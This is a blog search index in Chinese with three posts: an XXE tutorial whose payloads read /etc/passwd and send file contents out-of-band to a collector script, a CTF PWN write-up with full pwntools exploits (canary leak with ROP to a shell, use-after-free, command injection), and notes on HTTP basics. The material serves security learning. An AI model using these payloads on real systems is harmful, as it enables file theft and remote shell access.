<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>XXE 漏洞学习</title>
    <url>/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="xxe-漏洞学习"><a class="markdownIt-Anchor" href="#xxe-漏洞学习"></a> XXE 漏洞学习</h1>
<h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2>
<p>XXE注入是一种Web安全漏洞，它使攻击者能够干扰应用程序处理XML数据的方式。成功利用漏洞可以使攻击者查看应用程序服务器中的文件，并与应用程序可以访问的任何外部或后端系统进行交互。</p>
<h3 id="xml格式"><a class="markdownIt-Anchor" href="#xml格式"></a> XML格式</h3>
<p>XML代表可扩展标记语言，它像HTML，有一个树状的标签和数据结构，但XML没有预定义的标记，如h1，img，div，等; 标签是根据其表示的数据自定义命名的。</p>
<h3 id="xml实体"><a class="markdownIt-Anchor" href="#xml实体"></a> XML实体</h3>
<p>XML实体是一种表示XML文档中的数据项的方式，而不是使用数据本身。将其视为编程中的变量。</p>
<h3 id="文件类型定义dtd"><a class="markdownIt-Anchor" href="#文件类型定义dtd"></a> 文件类型定义（DTD）</h3>
<p>它包含可以定义XML文档的结构，可以包含的数据值的类型以及其他项目的声明。DTD可以完全独立于XML文档中（称为内部DTD），也可以从其他位置加载（称为外部DTD）。DTD（DOCTYPE）在XML文档开头的元素内声明。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE name_for_doctype[ &#123;some_data_here&#125; ]&gt;<br></code></pre></td></tr></table></figure>
<h3 id="xml自定义实体"><a class="markdownIt-Anchor" href="#xml自定义实体"></a> XML自定义实体</h3>
<p>自定义实体就像可以在DTD中创建的自定义变量。例如：<!DOCTYPE foo [ <!ENTITY myentity “my entity value" > ]&gt;。这里对实体的任何引用&amp;myentity;都将替换为数据“ my entitiy value&quot;。因此，知道我们可以创建自定义实体后，便可以使用来自应用程序服务器的预定义数据来创建一个自定义实体。</p>
<h3 id="xml外部实体"><a class="markdownIt-Anchor" href="#xml外部实体"></a> XML外部实体</h3>
<p>XML外部实体是一种自定义实体，其定义位于声明它们的DTD之外。</p>
<p>外部实体的声明使用SYSTEM关键字，并且必须指定一个URL，应从该URL加载实体的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM “http:&#x2F;&#x2F;attacker-controlled-site.com&quot; &gt; ]&gt;<br></code></pre></td></tr></table></figure>
<p>也可以使用其他协议，除了http如file。因此，我们可以从服务器/etc/passwd文件中提取数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt; ]&gt;<br></code></pre></td></tr></table></figure>
<h2 id="domdocumentphp"><a class="markdownIt-Anchor" href="#domdocumentphp"></a> DOMDocument.php</h2>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p>
<p>打开网页看到默认带了一段xml示例代码，这个DOCTYPE中已经有SYSTEM关键字，引用服务器的外部实体然后通过&amp;content使用这个实体检索数据</p>
<p>我们的payload可以写成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE PAYLOAD [<br>  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<br>]&gt;<br>  &lt;payload&gt;&amp;xxe;&lt;&#x2F;payload&gt;<br></code></pre></td></tr></table></figure>
<p>可以成功读取服务器的passwd文件</p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p>
<h2 id="simplexmlelementphp"><a class="markdownIt-Anchor" href="#simplexmlelementphp"></a> SimpleXMLElement.php</h2>
<p>查看源码，发现只是把读取的函数换成<code>SimpleXMLElement($data, LIBXML_NOENT)</code></p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p>
<p>发现原来的payload依然可以用</p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p>
<p>Payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE PAYLOAD [<br>  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<br>]&gt;<br>  &lt;payload&gt;&amp;xxe;&lt;&#x2F;payload&gt;<br></code></pre></td></tr></table></figure>
<h2 id="simplexml_load_stringphp"><a class="markdownIt-Anchor" href="#simplexml_load_stringphp"></a> simplexml_load_string.php</h2>
<p>查看源码，发现也只改了读取xml的函数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi>m</mi><mi>l</mi><mo>=</mo><mi>s</mi><mi>i</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi>x</mi><mi>m</mi><msub><mi>l</mi><mi>l</mi></msub><mi>o</mi><mi>a</mi><msub><mi>d</mi><mi>s</mi></msub><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">xml = simplexml_load_string(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span></span></span></span>data, ‘SimpleXMLElement’, LIBXML_NOENT);</p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p>
<p>使用原来的payload依然可以读取到密码</p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p>
<p>Payload为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">PAYLOAD</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">payload</span>&gt;</span> <br></code></pre></td></tr></table></figure>
<h2 id="blindxxephp"><a class="markdownIt-Anchor" href="#blindxxephp"></a> BlindXXE.php</h2>
<p>打开网页，根据名字提示应该是xxe盲注，百度一下发现这个如果要远程执行需要一个公网ip（前3个都是在github远程环境进行实验），所以这次在本地实验。</p>
<p>首先在需要接收密码的服务器端写一个PHP如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$file_name</span> = <span class="hljs-string">&quot;passwd.txt&quot;</span>;<br><span class="hljs-variable">$file_tmp</span> = fopen(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;a+&quot;</span>);<br><span class="hljs-variable">$data</span> .= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xxe&#x27;</span>];<br>fwrite(<span class="hljs-variable">$file_tmp</span>,<span class="hljs-variable">$data</span>);<br>fclose(<span class="hljs-variable">$file_tmp</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>然后建立一个dtd文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % xxe &quot;&lt;!ENTITY &amp;#x25; s SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpaudit-XXE-master&#x2F;1.php?xxe&#x3D;%d;&#39;&gt; &quot;&gt;<br></code></pre></td></tr></table></figure>
<p>最后payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[  &lt;!ENTITY % r SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpaudit-XXE-master&#x2F;get.dtd&quot;&gt;  &lt;!ENTITY % d SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;phpaudit-XXE-master&#x2F;etc&#x2F;passwd&quot;&gt;  %r;  %s;]&gt; <br></code></pre></td></tr></table></figure>
<p>效果如下</p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image014.jpg" alt="img"></p>
<p>虽然页面会有报错，但是我们的远端服务器确实可以接收到passwd的base64编码</p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p>
<p>也可以进行解码出密码</p>
<p><img src="/2021/05/12/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/clip_image018.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>web学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMTCTF春季赛-PWN</title>
    <url>/2021/03/30/cumtctf/</url>
    <content><![CDATA[<p>首先庆祝一下咋队得第二吧（原来是第二的，把密码学交了就显示第一了，当时没做出来）</p>
<p><img src="/2021/03/30/cumtctf/%E7%AC%AC%E4%B8%80.png" alt="图片"></p>
<h1 id="pwn1"><a class="markdownIt-Anchor" href="#pwn1"></a> PWN1</h1>
<p>查看程序，逻辑是读取你输入的字符串，然后和CUMTCTF对比，如果通过就执行bin/sh</p>
<p><img src="/2021/03/30/cumtctf/1.jpg" alt="img"></p>
<p>在比较前下个断点，进行调试，发现此时对比的是地址0x4008d5</p>
<p><img src="/2021/03/30/cumtctf/2.jpg" alt="img"></p>
<p>在看程序中输入的格式是“ld”，说明我们只能输入长整形，所以我们把0x4008d5转换为10进制进行输入4196565，然后调试.，发现此时验证通过了。</p>
<p><img src="/2021/03/30/cumtctf/3.jpg" alt="img"></p>
<p>拿到flag</p>
<p><img src="/2021/03/30/cumtctf/4.jpg" alt="img"></p>
<h1 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> PWN2</h1>
<p>先检查程序，发现程序开启了canary保护和堆栈不可执行</p>
<p><img src="/2021/03/30/cumtctf/5.jpg" alt="img"></p>
<p>然后查看程序，程序会先执行一个fmt（）函数，可以发现这里有一个格式字符串的漏洞，可以泄露canary值</p>
<p><img src="/2021/03/30/cumtctf/6.jpg" alt="img"></p>
<p>然后执行vul（）函数，可以看到这个函数读取的buf有0x64字节，而buf只有0x20字节存在栈溢出</p>
<p><img src="/2021/03/30/cumtctf/7.jpg" alt="img"><img src="/2021/03/30/cumtctf/8.jpg" alt="img"></p>
<p>所以解题思路是先泄露canary，然后构建rop链泄露puts函数地址，然后重启程序，再次泄露canary地址，构建rop链getshell</p>
<p><img src="/2021/03/30/cumtctf/9.jpg" alt="img"></p>
<p>因为canary的值距离栈顶是0x8个字节，64位Linux前六个参数用寄存器传递， 后面的才从栈上读取，所以要使var_8是printf函数的第8个参数，因此使用“%7$p”作为printf参数可以泄露出canary的值。所以payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary=<span class="hljs-string">&#x27;pwn2&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>\<span class="hljs-comment">#p=process(&#x27;./pwn2&#x27;)</span><br><br>p = remote(<span class="hljs-string">&quot;1.15.81.218&quot;</span>,<span class="hljs-number">10001</span>)<br><br>pop_rdi=<span class="hljs-number">0x400983</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>start_addr=<span class="hljs-number">0x4006A0</span><br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment"># 泄露canary</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链泄露puts的地址，然后重启程序</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got) + p64(puts_plt)+p64(start_addr)<br><br>p.send(payload)<br><br>\<span class="hljs-comment">#接收put真实地址</span><br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) <br><br>\<span class="hljs-comment">#计算libc基址</span><br><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>\<span class="hljs-comment">#获取程序中system的地址和/bin/sh的地址</span><br><br>binsh_addr = libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()+libc_base<br><br>system_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment">#再次泄露canary值</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链getshell</span><br><br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="pwn3"><a class="markdownIt-Anchor" href="#pwn3"></a> PWN3</h1>
<p>用ida打开程序，发现程序是一个选择菜单</p>
<p><img src="/2021/03/30/cumtctf/10.jpg" alt="img"></p>
<p>然后在选择1中，说是执行ping命令，但是没有进行过滤，会用system函数执行我们输入进去的命令</p>
<p><img src="/2021/03/30/cumtctf/11.jpg" alt="img"></p>
<p>选择1，然后1;cat flag，即可拿到Flag</p>
<p><img src="/2021/03/30/cumtctf/12.jpg" alt="img"></p>
<h1 id="pwn4"><a class="markdownIt-Anchor" href="#pwn4"></a> PWN4</h1>
<p>Ida打开程序，发现也是一个选择菜单</p>
<p><img src="/2021/03/30/cumtctf/a1.jpg" alt="img"></p>
<p>仔细观察每个选择，发现漏洞点在2.delete中，函数只是free了堆块，但是没有把指针置空，会造成uaf漏洞</p>
<p><img src="/2021/03/30/cumtctf/%E9%98%BF.jpg" alt="img"></p>
<p>Gdb调试：</p>
<p>先申请2个32字节的堆块（size为16 24 32的堆块free后会进入fastbin不会被合并）</p>
<p>可以看到我们申请的堆块对应一个内存堆和一个print_heap_name函数</p>
<p><img src="/2021/03/30/cumtctf/clip_image012.jpg" alt="img"></p>
<p>然后删除这两个堆块，可以看到删除的堆块进入了fastbin</p>
<p><img src="/2021/03/30/cumtctf/clip_image014.jpg" alt="img"></p>
<p>这时候我们申请一个堆块，size为8，内容为cccc</p>
<p><img src="/2021/03/30/cumtctf/clip_image016.jpg" alt="img"></p>
<p>此时覆盖了第一个堆块的print_heap_name函数指针</p>
<p><img src="/2021/03/30/cumtctf/clip_image018.jpg" alt="img"></p>
<p>然后我们选择show，就会调用这个指针，所以我们可以控制这个指针调用我们想要的函数</p>
<p><img src="/2021/03/30/cumtctf/clip_image020.jpg" alt="img"></p>
<p>程序中有后门函数，所以只要覆盖成这个就行</p>
<p><img src="/2021/03/30/cumtctf/clip_image022.jpg" alt="img"></p>
<p>Payload脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#!/usr/bin/env python</span><br><br>\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&quot;./pwn4&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10003</span>)<br><br>backdoor = <span class="hljs-number">0x0000000400BCE</span><br><br>\<span class="hljs-comment">#p = process(&quot;./pwn4&quot;)</span><br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;6666&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;7777&quot;</span>)<br><br>\<span class="hljs-comment">#删除index0</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>\<span class="hljs-comment">#删除index1</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为4的堆块，内容是后门函数</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(p32(backdoor))<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>\<span class="hljs-comment">#调用index0的print指针</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>p.interactive()<br><br> <br></code></pre></td></tr></table></figure>
<h1 id="pwn5"><a class="markdownIt-Anchor" href="#pwn5"></a> PWN5</h1>
<p>用ida打开程序，也是一个让我们选择的程序，选项1是创建账号，2是展示，3是删除，4是添加memory，5选项是验证main_account+16的位置的值是否等于1953330531，然后getshell</p>
<p><img src="/2021/03/30/cumtctf/clip_image024.jpg" alt="img"></p>
<p><img src="/2021/03/30/cumtctf/clip_image026.jpg" alt="img"></p>
<p>所以解题思路是覆盖这个位置的数据为1953330531</p>
<p>我们注意到删除账号的时候也只是进行了free，没有置空指针，有uaf漏洞利用</p>
<p><img src="/2021/03/30/cumtctf/clip_image028.jpg" alt="img"></p>
<p>然后在add memory时，可以读入256个字节。</p>
<p>Gdb调试：</p>
<p>先创建一个aaaa，bbbb的账号，堆内存如下</p>
<p><img src="/2021/03/30/cumtctf/clip_image030.jpg" alt="img"></p>
<p>然后尝试check，发现检查的main_account+16的位置是0x603010+0x40，也就是64个字节</p>
<p><img src="/2021/03/30/cumtctf/clip_image032.jpg" alt="img"></p>
<p>然后删除账号，添加一个memory，内容为68个c</p>
<p><img src="/2021/03/30/cumtctf/clip_image034.jpg" alt="img"></p>
<p>就可以覆盖到0x50的位置</p>
<p>所以只要把0x50位置的值覆盖为1953330531（十六进制0x746d7563）即可</p>
<p>Payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>\<span class="hljs-comment">#p = process(&#x27;./pwn5&#x27;)</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10004</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Create_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your first name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your last name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_memory</span>(<span class="hljs-params">payload</span>):</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;plz input what you want say:&quot;</span>)<br><br>  \<span class="hljs-comment">#gdb.attach(p)</span><br><br>  p.sendline(payload)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_CUMT</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>Create_your_account()<br><br>delete_your_account()<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+p64(<span class="hljs-number">0x746d7563</span>) <br><br>add_memory(payload)<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>check_CUMT()<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP协议学习</title>
    <url>/2021/03/26/http/</url>
    <content><![CDATA[<h1 id="http协议学习"><a class="markdownIt-Anchor" href="#http协议学习"></a> HTTP协议学习</h1>
<h2 id="http和https的区别"><a class="markdownIt-Anchor" href="#http和https的区别"></a> http和https的区别：</h2>
<ol>
<li>HTTP 的URL 以http:// 开头，而HTTPS 的URL 以https:// 开头</li>
<li>HTTP 是不安全的，而 HTTPS 是安全的</li>
<li>HTTP 标准端口是80 ，而 HTTPS 的标准端口是443</li>
<li>在OSI 网络模型中，HTTP工作于应用层，而HTTPS 的安全传输机制工作在传输层</li>
<li>HTTP 无法加密，而HTTPS 对传输的数据进行加密</li>
<li>HTTP无需证书，而HTTPS 需要CA机构wosign的颁发的SSL证书</li>
</ol>
<h2 id="http为什么是无状态协议如何解决"><a class="markdownIt-Anchor" href="#http为什么是无状态协议如何解决"></a> http为什么是无状态协议？如何解决？</h2>
<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理</p>
<p><strong>解决：</strong></p>
<ul>
<li>基于Session实现的会话保持<br>
在会话开始时（客户端第一次像服务器发送http请求），服务器将会话状态保存起来（本机内存或数据库中），然后分配一个会话标识（SessionId）给客户端，这个会话标识一般保存在客户端Cookie中，以后每次浏览器发送http请求都会带上Cookie中的SessionId到服务器，服务器拿到会话标识就可以把之前存储在服务器端的状态信息与会话联系起来，实现会话保持（如果遇到浏览器禁用Cookie的情况，则可以通过url重写的方式将会话标识放在url的参数里，也可实现会话保持）</li>
<li>基于Cookie实现的会话保持<br>
基于Cookie实现会话保持与上述基于Session实现会话保持的最主要区别是前者完全将会话状态信息存储在浏览器Cookie中，这样一来每次浏览器发送HTTP请求的时候都会带上状态信息，因此也就可以实现状态保持。</li>
</ul>
<h2 id="http常用的方法"><a class="markdownIt-Anchor" href="#http常用的方法"></a> http常用的方法</h2>
<ul>
<li>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器</li>
<li>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。</li>
<li>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。</li>
<li>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。</li>
<li>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。</li>
<li>OPTIONS：查询相应URI支持的HTTP方法。</li>
</ul>
<h2 id="http请求报文与响应报文格式"><a class="markdownIt-Anchor" href="#http请求报文与响应报文格式"></a> HTTP请求报文与响应报文格式</h2>
<p>请求报文包含四部分：</p>
<p><img src="/2021/03/26/http/1.png" alt="1"></p>
<ul>
<li>a、请求行：包含请求方法、URI、HTTP版本信息</li>
<li>b、请求首部字段</li>
<li>c、请求内容实体</li>
<li>d、空行</li>
</ul>
<p>响应报文包含四部分：</p>
<p><img src="/2021/03/26/http/2.png" alt="2"></p>
<p>常见的首部：</p>
<ul>
<li><strong>通用首部字段（请求报文与响应报文都会使用的首部字段）</strong>
<ul>
<li>Date：创建报文时间</li>
<li>Connection：连接的管理</li>
<li>Cache-Control：缓存的控制</li>
